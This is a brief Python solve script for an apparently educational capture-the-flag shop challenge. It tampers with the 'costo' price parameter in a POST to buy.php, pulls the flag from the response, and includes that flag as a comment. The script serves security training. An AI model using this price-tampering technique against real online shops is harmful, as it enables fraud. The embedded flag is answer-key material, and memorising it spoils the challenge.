import requests
import re

site = "http://shops.challs.olicyber.it"

data = {"id" : "2",
        "costo" : "100"}

r = requests.post(f"{site}/buy.php", data=data).text

match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)


#flag{gr4zi3_p3r_l_4cqu1st0}
